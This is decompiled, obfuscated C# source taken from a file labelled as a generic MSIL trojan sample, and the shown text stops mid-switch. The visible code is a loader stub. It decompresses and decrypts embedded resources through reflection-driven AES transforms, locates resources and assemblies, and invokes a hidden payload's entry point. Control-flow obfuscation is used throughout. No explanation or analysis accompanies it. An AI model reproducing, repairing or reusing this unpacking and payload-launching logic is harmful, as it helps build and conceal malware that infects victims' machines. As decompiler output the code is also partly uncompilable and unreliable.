// Decompiled with JetBrains decompiler
// Type: .
// Assembly: derver, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 76892F40-3DAD-430C-AF53-E7AE49BEB72F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Generic-07a4bc5a4a12d6d36ee0484e98a39c60cb30aff0d55c88d79edf9fd137667aca.exe

using \u0003;
using \u0004;
using SmartAssembly.MemoryManagement;
using System;
using System.Collections;
using System.Collections.Specialized;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0008
{
  internal sealed class \u0005
  {
    [NonSerialized]
    internal static \u0003.\u0004 \u0082;

    static int \u0001([In] \u0004.\u0004 obj0) => \u0004.\u0004.\u0001 - obj0.\u0004;

    static unsafe void \u0001([In] \u0001.\u0004.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      *(int*) voidPtr = obj0.\u0001.Length;
      int[] numArray = new int[(int) checked ((uint) obj0.\u0003)];
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      obj0.\u0002 = new short[(int) checked ((uint) obj0.\u0001.Length)];
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      while (*(int*) ((IntPtr) voidPtr + 8) < obj0.\u0003)
      {
        numArray[*(int*) ((IntPtr) voidPtr + 8)] = *(int*) ((IntPtr) voidPtr + 4);
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + (obj0.\u0001[*(int*) ((IntPtr) voidPtr + 8)] << 15 - *(int*) ((IntPtr) voidPtr + 8));
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
      }
      *(int*) ((IntPtr) voidPtr + 12) = 0;
      while (*(int*) ((IntPtr) voidPtr + 12) < obj0.\u0002)
      {
        *(int*) ((IntPtr) voidPtr + 16) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 12)];
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          obj0.\u0002[*(int*) ((IntPtr) voidPtr + 12)] = \u0008.\u0005.\u0001(numArray[*(int*) ((IntPtr) voidPtr + 16) - 1]);
          numArray[*(int*) ((IntPtr) voidPtr + 16) - 1] += 1 << 16 - *(int*) ((IntPtr) voidPtr + 16);
        }
        *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + 1;
      }
    }

    static unsafe int \u0001([In] \u0001.\u0004 obj0, [In] int obj1)
    {
      void* voidPtr;
      if (true)
      {
        if (true)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(8);
        }
        else
          goto label_5;
      }
      *(int*) voidPtr = 0;
label_5:
      for (; obj1 >= 4; obj1 >>= 1)
        *(int*) voidPtr = *(int*) voidPtr + 2;
      *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr + obj1;
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static int \u0001([In] \u0004.\u0003.\u0002 obj0)
    {
      int num1 = obj0.\u0002;
      int num2;
      int num3;
      while (true)
      {
        num2 = obj0.\u0001;
        if (true)
        {
          num3 = num1 - num2;
          if (false)
            num1 = num3;
          else
            goto label_7;
        }
        else
          break;
      }
label_2:
      do
      {
        if (true)
          num2 >>= 3;
      }
      while (false);
      return num1 + num2;
label_7:
      num2 = obj0.\u0003;
      num1 = num3;
      goto label_2;
    }

    static byte[] \u0001([In] string obj0)
    {
      byte[] numArray;
      if (true)
      {
        FileStream fileStream = (FileStream) null;
        if (true)
        {
          numArray = (byte[]) null;
          try
          {
            fileStream = \u001C.\u008C(obj0);
            numArray = new byte[\u0018.\u007E\u0086((object) fileStream)];
            int num = \u001A.\u007E\u0088((object) fileStream, numArray, 0, numArray.Length);
            \u001B.\u007E\u008B((object) fileStream);
          }
          finally
          {
            do
            {
              if (fileStream != null)
                \u001B.\u007E\u0089((object) fileStream);
              do
              {
                fileStream = (FileStream) null;
              }
              while (false);
            }
            while (false);
          }
        }
      }
      return numArray;
    }

    static void \u0001()
    {
      try
      {
        \u0008.\u0005.\u0001();
      }
      catch (Exception ex)
      {
      }
    }

    static byte[] \u0001([In] StringDictionary obj0)
    {
      string str1 = (string) null;
      string str2 = \u001D.\u007E\u008D((object) obj0, \u0006.\u0001.\u0002);
      bool flag;
      AppDomain appDomain;
      StringCollection stringCollection1;
      string str3;
      if (true)
      {
        str3 = \u001D.\u007E\u008D((object) obj0, \u0006.\u0001.\u0001);
        int num1;
        switch (str2)
        {
          case null:
            num1 = 1;
            break;
          default:
            num1 = \u001E.\u007E\u008E((object) global::\u0004.\u007E\u0007((object) str2), \u0008.\u0005.\u0082(221)) ? 1 : 0;
            break;
        }
        flag = num1 != 0;
        appDomain = global::\u0001.\u0001();
        stringCollection1 = new StringCollection();
        str1 = global::\u0004.\u007E\u0008((object) \u001F.\u007E\u0090((object) appDomain));
        if (!flag)
          str1 = \u007F.\u0091(str1, str2);
        int num2 = \u0080.\u007E\u0093((object) stringCollection1, str1);
      }
      int num3 = \u0080.\u007E\u0093((object) stringCollection1, \u007F.\u0091(str1, str3));
      byte[] numArray = \u0008.\u0005.\u0001(stringCollection1, str3);
      if (numArray != null)
        return numArray;
      StringCollection stringCollection2 = new StringCollection();
      string str4 = global::\u0004.\u007E\u000E((object) \u001F.\u007E\u0090((object) appDomain));
      if (str4 != null)
      {
        int num4 = \u0081.\u007E\u0094((object) global::\u0004.\u007E\u000F((object) str4));
        int num5 = 0;
        string[] strArray;
        int index;
        if (num5 == 0)
        {
          if (num4 > num5)
          {
            strArray = \u0082.\u007E\u0097((object) str4, new char[1]
            {
              Path.PathSeparator
            });
            index = 0;
            goto label_20;
          }
          else
            goto label_12;
        }
label_19:
        index = num4 + num5;
label_20:
        if (index >= strArray.Length)
          return \u0008.\u0005.\u0001(stringCollection2, str3);
        string str5 = \u0083.\u007E\u0098((object) strArray[index], new char[3]
        {
          ' ',
          '\t',
          Path.PathSeparator
        });
        if (!\u0084.\u0099(str5))
          str5 = \u007F.\u0091(global::\u0004.\u007E\u0008((object) \u001F.\u007E\u0090((object) appDomain)), str5);
        if (!flag)
          str5 = \u007F.\u0091(str5, str2);
        int num6 = \u0080.\u007E\u0093((object) stringCollection2, str5);
        int num7 = \u0080.\u007E\u0093((object) stringCollection2, \u007F.\u0091(str5, str3));
        int num8 = index;
        num5 = 1;
        num4 = num8;
        goto label_19;
      }
label_12:
      return (byte[]) null;
    }

    static string \u0001([In] string obj0)
    {
      string str1 = obj0;
      string str2 = \u0086.\u007E\u009B((object) str1, \u0008.\u0005.\u0082(234), \u0008.\u0005.\u0082(239));
      string str3 = \u0086.\u007E\u009B((object) str2, \u0008.\u0005.\u0082(244), \u0008.\u0005.\u0082(249));
      string str4 = \u0086.\u007E\u009B((object) str3, \u0008.\u0005.\u0082(254), \u0008.\u0005.\u0082(271));
      string str5 = \u0086.\u007E\u009B((object) str4, \u0008.\u0005.\u0082(276), \u0008.\u0005.\u0082(271));
      return \u0086.\u007E\u009B((object) str5, \u0008.\u0005.\u0082(199), \u0008.\u0005.\u0082(293));
    }

    static void \u0001([In] \u0004.\u0005 obj0, [In] int obj1)
    {
label_0:
      obj0.\u0001 >>= obj1;
      do
      {
        if (true)
          obj0.\u0003 -= obj1;
        else
          goto label_0;
      }
      while (false);
    }

    static int \u0001([In] \u0004.\u0005 obj0)
    {
      int num1;
      if (true)
      {
        int num2 = obj0.\u0002;
        int num3 = obj0.\u0001;
        int num4;
        int num5;
        while (true)
        {
          num4 = num2 - num3;
          num5 = obj0.\u0003;
          if (true)
            num5 >>= 3;
          if (false)
          {
            num3 = num5;
            num2 = num4;
          }
          else
            break;
        }
        int num6 = num4 + num5;
        if (false)
          return num6;
        num1 = num6;
      }
      return num1;
    }

    static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
label_0:
      byte[] publicKey1 = obj1.GetName().GetPublicKey();
      byte[] publicKey2 = obj0.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    static ICryptoTransform \u0001(
      [In] bool obj0,
      [In] byte[] obj1,
      [In] byte[] obj2,
      [In] \u0004.\u0002 obj3)
    {
      obj3.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj3.\u0001, new object[1]
      {
        (object) obj2
      });
      obj3.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj3.\u0001, new object[1]
      {
        (object) obj1
      });
      return (ICryptoTransform) obj3.\u0001.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(obj3.\u0001, new object[0]);
    }

    static void \u0001([In] int obj0, [In] \u0002.\u0002 obj1, [In] byte[] obj2, [In] int obj3)
    {
      for (int index1 = obj3; index1 < obj3 + obj0; ++index1)
      {
        byte[] numArray;
        int index2;
        (numArray = obj2)[index2 = index1] = (byte) ((int) numArray[(IntPtr) index2] ^ (int) \u0008.\u0005.\u0001(obj1));
        \u0008.\u0005.\u0001(obj2[index1], obj1);
      }
    }

    static byte[] \u0001([In] string obj0)
    {
      byte[] numArray = (byte[]) null;
      if (\u0006.\u0001.\u0001 == null)
        \u0006.\u0001.\u0001 = new ResourceManager(\u0008.\u0005.\u0082(298), \u0016.\u0082());
      try
      {
        \u0006.\u0001.\u0001 = true;
        if (true)
          goto label_15;
label_11:
        int num1;
        int num2 = num1;
        string str;
        int num3;
        for (int index = \u0081.\u007E\u0095((object) \u0006.\u0001.\u0001); num2 < index; num2 = num3)
        {
          try
          {
            ResourceManager resourceManager = (ResourceManager) \u0087.\u007E\u009C((object) \u0006.\u0001.\u0001, num1);
            if (resourceManager != null)
              numArray = (byte[]) \u0088.\u007E\u009D((object) resourceManager, str);
          }
          catch
          {
          }
          if (numArray == null)
          {
            num3 = num1;
            int num4 = 1;
            if (num4 != 0)
            {
              num1 = num3 + num4;
              goto label_11;
            }
            else
              index = num4;
          }
          else
            break;
        }
label_13:
        if (numArray == null)
        {
          numArray = (byte[]) \u0088.\u007E\u009D((object) \u0006.\u0001.\u0001, str);
          goto label_17;
        }
        else
          goto label_17;
label_15:
        str = \u0008.\u0005.\u0001(obj0);
        if (numArray == null && \u0006.\u0001.\u0001 != null)
        {
          num1 = 0;
          goto label_11;
        }
        else
          goto label_13;
      }
      finally
      {
        \u0006.\u0001.\u0001 = false;
      }
label_17:
      return numArray;
    }

    static int \u0001([In] \u0004.\u0003.\u0003 obj0) => 32768 - obj0.\u0002;

    static void \u0001([In] \u0008.\u0001 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static int \u0001([In] \u0004.\u0003.\u0002 obj0) => obj0.\u0003;

    static byte[] \u0001([In] StringCollection obj0, [In] string obj1)
    {
      int num = 0;
      while (num < \u0081.\u007E\u0096((object) obj0))
      {
        string str1 = \u007F.\u0091(\u0089.\u007E\u009E((object) obj0, num), \u007F.\u0092(obj1, \u0006.\u0001.\u0003));
        if (true)
          goto label_8;
label_2:
        string str2;
        if (true)
        {
          if (\u0084.\u009A(str2))
            return \u0008.\u0005.\u0001(str2);
          ++num;
          continue;
        }
        continue;
label_8:
        str2 = str1;
        goto label_2;
      }
      return (byte[]) null;
    }

    static int \u0001([In] \u0004.\u0005 obj0) => obj0.\u0003;

    static void \u0001([In] byte[] obj0, [In] \u0001.\u0004.\u0001 obj1, [In] short[] obj2)
    {
      obj1.\u0002 = obj2;
      obj1.\u0001 = obj0;
    }

    static void \u0001([In] \u0001.\u0004.\u0001 obj0)
    {
label_0:
      int index = 0;
label_9:
      while (true)
      {
        int num1 = index;
        int num2 = obj0.\u0001.Length;
        do
        {
          if (true)
            goto label_5;
label_2:
          continue;
label_5:
          int num3 = num2;
          if (num1 < num3)
          {
            if (true)
            {
              obj0.\u0001[index] = (short) 0;
              int num4 = index;
              num2 = 1;
              num1 = num4;
              goto label_2;
            }
            else
              goto label_9;
          }
          else
            goto label_10;
        }
        while (num2 == 0);
        index = num1 + num2;
      }
label_10:
      do
      {
        obj0.\u0002 = (short[]) null;
        obj0.\u0001 = (byte[]) null;
        if (false)
          goto label_0;
      }
      while (false);
    }

    static void \u0001([In] \u0004.\u0006 obj0)
    {
      if (false)
        return;
      obj0.\u0001 = obj0.\u0002 = obj0.\u0003 = 0;
    }

    static int \u0001([In] string[] obj0, [In] Assembly obj1)
    {
      object[] objArray1;
      object[] objArray2;
      MethodInfo methodInfo1;
      if (true)
      {
        MethodInfo methodInfo2 = \u008A.\u007E\u009F((object) obj1);
        if (true)
          goto label_14;
label_2:
        ParameterInfo[] parameterInfoArray = \u008B.\u007E\u0001\u0002((object) methodInfo1);
        objArray2 = (object[]) null;
        if (parameterInfoArray != null)
        {
          int length = parameterInfoArray.Length;
          do
          {
            if (true)
            {
              if (length > 0)
                length = 1;
              else
                goto label_9;
            }
          }
          while (length == 0);
          objArray1 = new object[length];
          goto label_8;
        }
        else
          goto label_9;
label_14:
        methodInfo1 = methodInfo2;
        goto label_2;
      }
      else
        goto label_10;
label_8:
      objArray1[0] = (object) obj0;
      objArray2 = objArray1;
label_9:
      object obj = \u008C.\u007E\u0002\u0002((object) methodInfo1, (object) null, objArray2);
label_10:
      if (true)
        return obj == null || !(obj is int) ? 0 : (int) obj;
      goto label_8;
    }

    static int \u0001([In] \u0004.\u0003.\u0002 obj0, [In] int obj1)
    {
      while (obj0.\u0003 < obj1)
      {
        if (obj0.\u0001 == obj0.\u0002)
        {
          if (true)
          {
            if (true)
              return -1;
          }
          else
            break;
        }
        else if (true)
        {
          \u0004.\u0003.\u0002 obj2 = obj0;
          int num1 = (int) obj2.\u0001;
          byte[] numArray1 = obj0.\u0001;
          \u0004.\u0003.\u0002 obj3 = obj0;
          int num2;
          int num3 = num2 = obj3.\u0001;
          obj3.\u0001 = num2 + 1;
          int index1 = num3;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = obj0.\u0001;
          \u0004.\u0003.\u0002 obj4 = obj0;
          int num5;
          int num6 = num5 = obj4.\u0001;
          obj4.\u0001 = num5 + 1;
          int index2 = num6;
          int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num8 = (num4 | num7) << obj0.\u0003;
          obj2.\u0001 = (uint) (num1 | num8);
        }
        else
          continue;
        obj0.\u0003 += 16;
        break;
      }
      long num9 = (long) obj0.\u0001;
      int num10 = 1;
      int num11 = obj1;
      int num12;
      do
      {
        if (true)
        {
          int num13 = num11 & 31;
          num12 = num10 << num13;
          if (true)
          {
            num11 = 1;
            num10 = num12;
          }
          else
            goto label_15;
        }
      }
      while (num11 == 0);
      int num14 = num10 - num11;
      goto label_13;
label_15:
      num14 = num12;
label_13:
      long num15 = (long) num14;
      return (int) (num9 & num15);
    }

    static short \u0001([In] int obj0) => (short) ((int) \u0004.\u0003.\u0006.\u0001[obj0 & 15] << 12 | (int) \u0004.\u0003.\u0006.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0004.\u0003.\u0006.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0004.\u0003.\u0006.\u0001[obj0 >> 12]);

    static unsafe bool \u0001([In] \u0002.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      int num1 = \u0008.\u0005.\u0001(obj0.\u0001);
      while (num1 >= 258)
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
        switch (*(int*) ((IntPtr) voidPtr + 8))
        {
          case 7:
            int num2;
            while (((num2 = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0001)) & -256) == 0)
            {
              \u0008.\u0005.\u0001(obj0.\u0001, num2);
              if (--num1 < 258)
              {
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                goto label_27;
              }
            }
            if (num2 < 257)
            {
              if (num2 < 0)
              {
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                goto label_27;
              }
              else
              {
                obj0.\u0002 = (\u0008.\u0004) null;
                obj0.\u0001 = (\u0008.\u0004) null;
                obj0.\u0001 = 2;
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
                goto label_27;
              }
            }
            else
            {
              try
              {
                obj0.\u0004 = \u0002.\u0003.\u0001[num2 - 257];
                obj0.\u0003 = \u0002.\u0003.\u0002[num2 - 257];
                goto case 8;
              }
              catch (Exception ex)
              {
                throw new FormatException(\u0008.\u0005.\u0082(303));
              }
            }
          case 8:
            if (obj0.\u0003 > 0)
            {
              obj0.\u0001 = 8;
              *(int*) voidPtr = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0003);
              if (*(int*) voidPtr < 0)
              {
                *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                goto label_27;
              }
              else
              {
                \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0003);
                obj0.\u0004 += *(int*) voidPtr;
              }
            }
            obj0.\u0001 = 9;
            goto case 9;
          case 9:
            int index = \u0008.\u0005.\u0001(obj0.\u0002, obj0.\u0001);
            if (index < 0)
            {
              *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
              goto label_27;
            }
            else
            {
              try
              {
                obj0.\u0005 = \u0002.\u0003.\u0003[index];
                obj0.\u0003 = \u0002.\u0003.\u0004[index];
                goto case 10;
              }
              catch (Exception ex)
              {
                throw new FormatException(\u0008.\u0005.\u0082(336));
              }
            }
          case 10:
            if (obj0.\u0003 > 0)
            {
              obj0.\u0001 = 10;
              *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0003);
              if (true)
              {
                if (*(int*) ((IntPtr) voidPtr + 4) < 0)
                {
                  *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 0;
                  goto label_27;
                }
                else
                {
                  \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0003);
                  obj0.\u0005 += *(int*) ((IntPtr) voidPtr + 4);
                }
              }
              else
                goto label_27;
            }
            \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0004, obj0.\u0005);
            num1 -= obj0.\u0004;
            obj0.\u0001 = 7;
            continue;
          default:
            throw new FormatException();
        }
      }
      *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) 1;
label_27:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 12);
    }

    static unsafe void \u0001([In] int obj0, [In] \u000E obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(24);
      obj1.\u000F = \u0005.\u0002.\u0001[obj0];
      obj1.\u0008 = \u0005.\u0002.\u0002[obj0];
      obj1.\u000E = \u0005.\u0002.\u0003[obj0];
      obj1.\u0007 = \u0005.\u0002.\u0004[obj0];
      if (\u0005.\u0002.\u0005[obj0] == obj1.\u0010)
        return;
      *(int*) voidPtr = obj1.\u0010;
      switch (*(int*) voidPtr)
      {
        case 0:
          if (obj1.\u0005 > obj1.\u0004)
          {
            \u0001.\u0004 obj = obj1.\u0001;
            byte[] numArray = obj1.\u0001;
            *(int*) ((IntPtr) voidPtr + 16) = obj1.\u0004;
            *(int*) ((IntPtr) voidPtr + 20) = obj1.\u0005 - obj1.\u0004;
            \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 20), numArray, obj, false, *(int*) ((IntPtr) voidPtr + 16));
            obj1.\u0004 = obj1.\u0005;
          }
          \u0008.\u0005.\u0001(obj1);
          goto default;
        case 1:
          if (obj1.\u0005 > obj1.\u0004)
          {
            \u0001.\u0004 obj = obj1.\u0001;
            byte[] numArray = obj1.\u0001;
            if (true)
            {
              *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0004;
              *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0005 - obj1.\u0004;
              \u0008.\u0005.\u0001(numArray, false, obj, *(int*) ((IntPtr) voidPtr + 4), *(int*) ((IntPtr) voidPtr + 8));
              if (true)
              {
                obj1.\u0004 = obj1.\u0005;
                goto default;
              }
              else
                goto default;
            }
            else
              break;
          }
          else
            goto default;
        case 2:
          if (obj1.\u0001)
          {
            \u0001.\u0004 obj = obj1.\u0001;
            *(int*) ((IntPtr) voidPtr + 12) = (int) obj1.\u0001[obj1.\u0005 - 1] & (int) byte.MaxValue;
            \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 12), obj);
          }
          if (obj1.\u0005 <= obj1.\u0004)
            goto label_14;
          else
            break;
        default:
label_15:
          obj1.\u0010 = \u0005.\u0002.\u0005[obj0];
          return;
      }
      \u0001.\u0004 obj2 = obj1.\u0001;
      byte[] numArray1 = obj1.\u0001;
      *(int*) ((IntPtr) voidPtr + 4) = obj1.\u0004;
      *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0005 - obj1.\u0004;
      \u0008.\u0005.\u0001(numArray1, false, obj2, *(int*) ((IntPtr) voidPtr + 4), *(int*) ((IntPtr) voidPtr + 8));
      obj1.\u0004 = obj1.\u0005;
label_14:
      obj1.\u0001 = false;
      obj1.\u0003 = 2;
      goto label_15;
    }

    static void \u0001([In] \u0004.\u0002 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static void \u0001([In] \u0004.\u0003.\u0003 obj0, [In] int obj1)
    {
label_0:
      do
      {
        \u0004.\u0003.\u0003 obj2 = obj0;
        int num1;
        int num2 = num1 = obj2.\u0002;
        obj2.\u0002 = num1 + 1;
        do
        {
          if (true)
          {
            if (num2 != 32768)
              goto label_3;
label_2:
            goto label_0;
label_3:
            if (true)
            {
              byte[] numArray = obj0.\u0001;
              \u0004.\u0003.\u0003 obj3 = obj0;
              int num3;
              num2 = num3 = obj3.\u0001;
              obj3.\u0001 = num3 + 1;
              int index = num2;
              int num4 = (int) (byte) obj1;
              numArray[index] = (byte) num4;
              if (false)
                goto label_2;
            }
            else
              goto label_0;
          }
          else
            goto label_0;
        }
        while (false);
        goto label_5;
      }
      while (false);
      goto label_7;
label_5:
      obj0.\u0001 &= (int) short.MaxValue;
      return;
label_7:
      throw new InvalidOperationException();
    }

    static unsafe int \u0001([In] \u0004.\u0004 obj0, [In] \u0004.\u0005 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      obj2 = Math.Min(Math.Min(obj2, \u0004.\u0004.\u0001 - obj0.\u0004), \u0008.\u0005.\u0001(obj1));
      *(int*) ((IntPtr) voidPtr + 4) = \u0004.\u0004.\u0001 - obj0.\u0003;
      if (obj2 > *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = \u0008.\u0005.\u0001(obj1, obj0.\u0001, obj0.\u0003, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
          *(int*) voidPtr = *(int*) voidPtr + \u0008.\u0005.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
      }
      else
        *(int*) voidPtr = \u0008.\u0005.\u0001(obj1, obj0.\u0001, obj0.\u0003, obj2);
      obj0.\u0003 = obj0.\u0003 + *(int*) voidPtr & \u0004.\u0004.\u0002;
      obj0.\u0004 += *(int*) voidPtr;
      *(int*) ((IntPtr) voidPtr + 8) = *(int*) voidPtr;
      return *(int*) ((IntPtr) voidPtr + 8);
    }

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u0004.\u0003.\u0001 obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      do
      {
        num1 = obj3.\u0001;
        num2 = 11;
        if (num2 != 0)
        {
          if (num1 != num2)
            goto label_8;
label_3:
          if (!\u0008.\u0005.\u0001(obj3))
          {
            int num3 = obj3.\u0001.\u0002;
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            continue;
label_8:
          *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0005.\u0001(obj0, obj3.\u0001, obj2, obj1);
          obj1 += *(int*) ((IntPtr) voidPtr + 4);
          *(int*) voidPtr = *(int*) voidPtr + *(int*) ((IntPtr) voidPtr + 4);
          obj0 -= *(int*) ((IntPtr) voidPtr + 4);
          if (obj0 != 0)
            goto label_3;
          else
            goto label_2;
        }
label_5:;
      }
      while (num1 > num2 && obj3.\u0001 != 11);
      goto label_6;
label_2:
      return *(int*) voidPtr;
label_6:
      return *(int*) voidPtr;
    }

    static void \u0001([In] \u000E obj0) => obj0.\u0002 = (int) obj0.\u0001[obj0.\u0005] << 5 ^ (int) obj0.\u0001[obj0.\u0005 + 1];

    static ICryptoTransform \u0001(
      [In] bool obj0,
      [In] byte[] obj1,
      [In] \u0008.\u0001 obj2,
      [In] byte[] obj3)
    {
      obj2.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj2.\u0001, new object[1]
      {
        (object) obj3
      });
      obj2.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj2.\u0001, new object[1]
      {
        (object) obj1
      });
      return (ICryptoTransform) obj2.\u0001.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(obj2.\u0001, new object[0]);
    }

    static unsafe bool \u0001([In] \u0002.\u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      for (; obj0.\u0003 > 0; obj0.\u0003 -= 8)
      {
        *(int*) voidPtr = \u0008.\u0005.\u0001(obj0.\u0001, 8);
        if (*(int*) voidPtr < 0)
        {
          *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
          goto label_5;
        }
        else
        {
          \u0008.\u0005.\u0001(obj0.\u0001, 8);
          obj0.\u0002 = obj0.\u0002 << 8 | *(int*) voidPtr;
        }
      }
      if ((int) obj0.\u0001.\u0001() != obj0.\u0002)
        throw new FormatException(\u0008.\u0005.\u0082(365) + (object) (int) obj0.\u0001.\u0001() + \u0008.\u0005.\u0082(406) + (object) obj0.\u0002);
      obj0.\u0001 = 12;
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
label_5:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
    }

    static unsafe bool \u0001([In] \u0004.\u0003.\u0005 obj0, [In] \u0004.\u0003.\u0002 obj1)
    {
      int num1 = 8;
      void* voidPtr;
      if (num1 != 0)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        goto label_43;
      }
label_2:
      int num2;
      int num3;
      int num4;
      int num5;
      switch (num1)
      {
        case 0:
          obj0.\u0002 = \u0008.\u0005.\u0001(obj1, 5);
          if (obj0.\u0002 < 0)
            return false;
          obj0.\u0002 += 257;
          \u0008.\u0005.\u0001(obj1, 5);
          obj0.\u0001 = 1;
          goto case 1;
        case 1:
          obj0.\u0003 = \u0008.\u0005.\u0001(obj1, 5);
          if (obj0.\u0003 >= 0)
          {
            ++obj0.\u0003;
            \u0008.\u0005.\u0001(obj1, 5);
            obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
            obj0.\u0002 = new byte[obj0.\u0005];
            obj0.\u0001 = 2;
            goto case 2;
          }
          else
            break;
        case 2:
          obj0.\u0004 = \u0008.\u0005.\u0001(obj1, 4);
          if (obj0.\u0004 < 0)
            return false;
          obj0.\u0004 += 4;
          \u0008.\u0005.\u0001(obj1, 4);
          obj0.\u0001 = new byte[19];
          obj0.\u0007 = 0;
          goto label_12;
        case 3:
label_19:
          num4 = obj0.\u0007;
          num5 = obj0.\u0004;
          if (true)
          {
            if (num4 < num5)
            {
              *(int*) voidPtr = \u0008.\u0005.\u0001(obj1, 3);
              goto label_14;
            }
            else
            {
              obj0.\u0001 = new \u0004.\u0003.\u0004(obj0.\u0001);
              obj0.\u0001 = (byte[]) null;
              obj0.\u0007 = 0;
              if (true)
              {
                obj0.\u0001 = 4;
                goto case 4;
              }
              else
                break;
            }
          }
          else
            goto label_25;
        case 4:
label_27:
          int num6;
          if (((num6 = \u0008.\u0005.\u0001(obj0.\u0001, obj1)) & -16) == 0)
          {
            if (true)
            {
              byte[] numArray = obj0.\u0002;
              num2 = obj0.\u0007++;
              int index = num2;
              int num7 = (int) (obj0.\u0001 = (byte) num6);
              numArray[index] = (byte) num7;
              int num8 = obj0.\u0007;
              num5 = obj0.\u0005;
              num4 = num8;
              goto label_25;
            }
            else
              goto label_12;
          }
          else
          {
            if (num6 < 0)
              return false;
            if (num6 >= 17)
              obj0.\u0001 = (byte) 0;
            obj0.\u0006 = num6 - 16;
            if (true)
            {
              obj0.\u0001 = 5;
              goto case 5;
            }
            else
              goto case 5;
          }
        case 5:
